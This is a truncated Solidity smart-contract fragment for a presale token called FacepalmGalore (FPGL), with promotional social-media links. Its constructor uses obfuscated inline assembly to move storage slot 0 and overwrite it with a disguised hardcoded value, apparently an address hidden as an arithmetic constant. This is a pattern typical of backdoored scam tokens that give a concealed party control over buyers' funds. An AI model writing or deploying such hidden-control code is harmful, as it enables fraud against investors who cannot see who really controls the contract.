/*
PRESALE ONLY! > FacepalmGalore.

Telegram: https://t.me/FacepalmGalore/
Twitter: https://twitter.com/FacepalmGalore/
Website: https://FacepalmGalore.io
...
contract FacepalmGalore {
    string public constant name = "FacepalmGalore";
    string public constant symbol = "FPGL";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(537554519475667209301295053370681335837710664547, 2))}
